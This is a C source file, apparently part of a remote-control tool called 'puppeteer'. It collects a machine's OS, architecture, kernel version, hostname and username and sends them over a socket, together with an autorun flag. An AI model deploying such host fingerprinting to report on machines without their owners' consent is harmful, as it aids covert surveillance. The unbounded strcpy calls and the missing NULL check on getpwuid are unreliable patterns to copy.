// MIT License
/*
 * This header file belongs to https://github.com/arthur-bryan/puppeteer
 *
 * Gets some PC informations like architecture, hostname and username
 * and send it over socket
 *
 * Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>
 */
#include "../include/information.h"

#include <unistd.h>
#include <sys/utsname.h>
#include <string.h>
#include <pwd.h>

#include "../include/sockets.h"
#include "../include/footprint.h"


/*
 * Fills the pointers to char with its respectives data about the PC
 * informations.
 *
 * Parameters:
 *      char *op_system:    to store the operating system
 *      char *architecture: to store the system architecture
 *      char *hostname:     to store the PC hostname
 *      char *username:     to store the logged-in username
 */
host_t
get_host_info(void) {
    struct passwd   *user;
    struct utsname  host_info;
    host_t          host;

    user = getpwuid(getuid());
    uname(&host_info);
    strcpy(host.op_system, host_info.sysname);
    strcpy(host.architecture, host_info.machine);
    strcpy(host.kernel_release, host_info.release);
    gethostname(host.hostname, sizeof host.hostname);
    strcpy(host.username, user->pw_name);
    host.autorun_enabled = 0;
    return host;
}

/*
 * Sends the PC information over the socket after filling the host strucure
 * First send the length of the string to be sent, and then sends the string
 * itself. This proccess repeats for each host structure member to ensure that
 * the bytes will be sent correctly.
 *
 * Parameters:
 *      int16_t socket_fd:  the socket file descriptor
 */
void
send_host_info(int16_t socket_fd, host_t host) {
    uint32_t op_system_len = strlen(host.op_system) + 1;
    uint32_t arch_len = strlen(host.architecture) + 1;
    uint32_t kernel_len = strlen(host.kernel_release) + 1;
    uint32_t hostname_len = strlen(host.hostname) + 1;
    uint32_t username_len = strlen(host.username) + 1;

    send(socket_fd, &op_system_len, sizeof op_system_len, 0);
    send(socket_fd, host.op_system, op_system_len, 0);

    send(socket_fd, &arch_len, sizeof arch_len, 0);
    send(socket_fd, host.architecture, arch_len, 0);

    send(socket_fd, &kernel_len, sizeof kernel_len, 0);
    send(socket_fd, host.kernel_release, kernel_len, 0);

    send(socket_fd, &hostname_len, sizeof hostname_len, 0);
    send(socket_fd, host.hostname, hostname_len, 0);

    send(socket_fd, &username_len, sizeof username_len, 0);
    send(socket_fd, host.username, username_len, 0);

    send(socket_fd, &host.autorun_enabled, sizeof host.autorun_enabled, 0);
}
